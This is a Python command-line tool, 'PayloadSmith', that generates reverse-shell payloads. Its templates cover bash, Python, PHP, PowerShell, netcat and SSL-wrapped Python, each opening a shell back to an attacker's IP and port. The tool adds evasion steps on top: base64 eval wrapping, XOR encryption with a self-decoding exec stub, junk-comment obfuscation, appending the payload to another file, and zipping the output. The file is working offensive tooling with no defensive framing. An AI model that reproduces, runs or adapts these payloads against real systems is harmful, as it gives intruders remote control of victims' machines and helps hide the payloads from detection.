import argparse
import base64
import hashlib
from colorama import Fore, Style
import random
import string
import sys
import textwrap
import os
import tempfile
import zipfile

# Payload templates
payload_templates = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "python": "python -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\"])'",
    "php": "<?php $sock=fsockopen('{ip}',{port});exec('/bin/sh -i <&3 >&3 2>&3'); ?>",
    "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()",
    "nc": "nc -e /bin/sh {ip} {port}",
    "python_https": textwrap.dedent("""
        import socket, ssl, subprocess, os
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = ssl.wrap_socket(s)
        s.connect(("{ip}", {port}))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        subprocess.call(["/bin/sh"])
    """).strip()
}

def obfuscate_payload(payload):
    junk = ''.join(random.choices(string.ascii_letters, k=5))
    whitespace = " " * random.randint(1, 3)
    return f"{payload}{whitespace}# {junk}"

def encode_payload(payload, encoding_type):
    if encoding_type == "base64":
        encoded = base64.b64encode(payload.encode()).decode()
        return f"<?php eval(base64_decode('{encoded}')); ?>"
    return payload

def bind_payload(payload, file_to_bind):
    try:
        with open(file_to_bind, "r") as f:
            original = f.read()
        combined = f"{original}\n\n# Bound Payload Below\n{payload}"
        return combined
    except Exception as e:
        print(f"[!] Failed to bind payload: {e}")
        return payload

def xor_encrypt(payload, key):
    return ''.join(chr(ord(c) ^ ord(key)) for c in payload)

def stub_decoder(encoded_payload, key):
    stub = f"""
import sys
payload = '{encoded_payload}'
key = '{key}'
decoded = ''.join([chr(ord(c) ^ ord(key)) for c in payload])
exec(decoded)
"""
    return stub

def print_payload(title, payload):
    print(f"\n{Fore.GREEN}[+] {title} Payload:{Style.RESET_ALL}")
    print(f"{payload}\n")
    hash_digest = hashlib.sha256(payload.encode()).hexdigest()
    print(f"{Fore.YELLOW}[#] SHA256: {hash_digest}{Style.RESET_ALL}")
    return hash_digest

def list_payloads():
    print("\nAvailable Shell Types:")
    for key in payload_templates:
        print(f" - {key}")

def generate_payload(shell_type, ip, port, obfuscate=False, encode=None, bind_file=None, xor_key=None):
    raw = payload_templates[shell_type].format(ip=ip, port=port)
    if encode:
        raw = encode_payload(raw, encode)
    if xor_key:
        encrypted = xor_encrypt(raw, xor_key)
        raw = stub_decoder(encrypted, xor_key)
    if obfuscate:
        raw = obfuscate_payload(raw)
    if bind_file:
        raw = bind_payload(raw, bind_file)
    return raw

def write_to_temp_zip(payload, name_hint="payload"):
    temp_dir = tempfile.gettempdir()
    filename = os.path.join(temp_dir, f"{name_hint}_{random.randint(1000,9999)}.txt")
    zipname = filename.replace(".txt", ".zip")
    with open(filename, "w") as f:
        f.write(payload)
    with zipfile.ZipFile(zipname, 'w') as zipf:
        zipf.write(filename, os.path.basename(filename))
    print(f"[*] Payload written to ZIP: {zipname}")
    os.remove(filename)

def multi_payload(ip, port, obfuscate=False, encode=None, no_copy=False, bind_file=None, xor_key=None):
    for shell in payload_templates:
        try:
            payload = generate_payload(shell, ip, port, obfuscate, encode, bind_file, xor_key)
            print_payload(shell.upper(), payload)
            if not no_copy:
                try:
                    import pyperclip
                    pyperclip.copy(payload)
                    print("[*] Payload copied to clipboard!")
                except ImportError:
                    print("[!] pyperclip not installed. Skipping clipboard copy.")
        except Exception as e:
            print(f"[!] Failed to generate {shell} payload: {e}")

def main():
    parser = argparse.ArgumentParser(description="PayloadSmith - Reverse Shell Payload Generator")
    parser.add_argument("--shell", help="Type of shell to generate")
    parser.add_argument("--ip", required=True, help="Attacker IP")
    parser.add_argument("--port", required=True, help="Attacker Port")
    parser.add_argument("--encode", help="Encoding type (e.g., base64)")
    parser.add_argument("--obfuscate", action="store_true", help="Obfuscate the payload")
    parser.add_argument("--output", help="Output to file")
    parser.add_argument("--no-copy", action="store_true", help="Do not copy payload to clipboard")
    parser.add_argument("--list", action="store_true", help="List available payloads")
    parser.add_argument("--multi", action="store_true", help="Generate all payloads")
    parser.add_argument("--bind", help="Bind payload to another file")
    parser.add_argument("--xor", help="Apply XOR encoding with given key")
    parser.add_argument("--zip", action="store_true", help="Write payload to temporary ZIP file")
    args = parser.parse_args()

    if args.list:
        list_payloads()
        sys.exit()

    if args.multi:
        multi_payload(args.ip, args.port, args.obfuscate, args.encode, args.no_copy, args.bind, args.xor)
        sys.exit()

    if not args.shell:
        print("[!] Please specify a shell type using --shell")
        sys.exit()

    try:
        payload = generate_payload(args.shell, args.ip, args.port, args.obfuscate, args.encode, args.bind, args.xor)
        print_payload("Generated", payload)

        if not args.no_copy:
            try:
                import pyperclip
                pyperclip.copy(payload)
                print("[*] Payload copied to clipboard!")
            except ImportError:
                print("[!] pyperclip not installed. Skipping clipboard copy.")

        if args.output:
            with open(args.output, "w") as f:
                f.write(payload)
            print(f"[*] Payload written to {args.output}")

        if args.zip:
            write_to_temp_zip(payload)

    except KeyError:
        print("[!] Invalid shell type specified. Use --list to see options.")

if __name__ == "__main__":
    main()
